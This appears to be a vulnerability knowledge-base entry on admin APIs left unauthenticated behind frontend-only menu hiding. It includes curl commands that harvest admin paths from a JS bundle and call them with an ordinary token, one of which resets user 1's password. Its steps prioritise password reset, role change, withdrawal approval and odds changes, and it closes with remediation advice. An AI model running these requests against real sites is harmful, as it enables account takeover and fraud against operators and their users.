---
title: Unauthenticated admin API (menus hidden only in the frontend)
cve: None (business logic)
severity: critical
cvss: 9.1
product: Custom turnkey platform / agent backend
versions: Any
ports: 80, 443
keywords: admin api, unauthenticated, broken access control, frontend hiding, menus
entry: Access /api/admin/* directly with a regular token
verified: false
sources: Compiled from public sources (business logic; no CVE)
---

## Fingerprints

- The frontend bundle contains `/api/admin/...`, `/prod-api/admin/...`, and `/manage/...` paths (`grep -o '/api/admin/[a-zA-Z0-9_/-]*' app.js`).
- Responses for regular accounts contain fields such as `isAdmin`/`menus`.

## Prerequisites

- Any regular account token; admin paths can be extracted from JS.

## PoC

```bash
# Extract admin paths from the bundle
curl -s https://target/static/js/app.js | grep -oE '/api/admin/[a-zA-Z0-9_/-]+' | sort -u | head -30

# Access directly with a regular token
curl -s https://target/api/admin/user/list?pageNo=1 -H "Authorization: Bearer <regular token>"
curl -s https://target/api/admin/withdraw/list?status=pending -H "Authorization: Bearer <regular token>"
curl -s -X POST https://target/api/admin/user/resetPassword -H "Authorization: Bearer <regular token>" -H 'content-type: application/json' -d '{"uid":1,"password":"Passw0rd!"}'
```

## Exploitation Steps

1. Extract a list of admin paths from JS / swagger / older H5 packages.
2. Try each with a regular token, looking for `200 + data` (403/401 is the expected behavior).
3. A successful list request exposes site-wide members/orders; a successful write operation allows direct account takeover or approval-status changes.
4. Prioritize write endpoints for "reset password", "change role", "approve withdrawal", and "change odds".
5. Evidence: one list request returning 200 + the response record count; perform write operations only on your own account.

## Remediation and Mitigation

- Enforce role-based authorization on the server (not frontend hiding); use a separate domain/internal network for administration.
- Make paths non-enumerable (add a unified gateway prefix); audit and rate-limit every admin endpoint.

## References

- OWASP API Security Top 10：API5 BFLA。
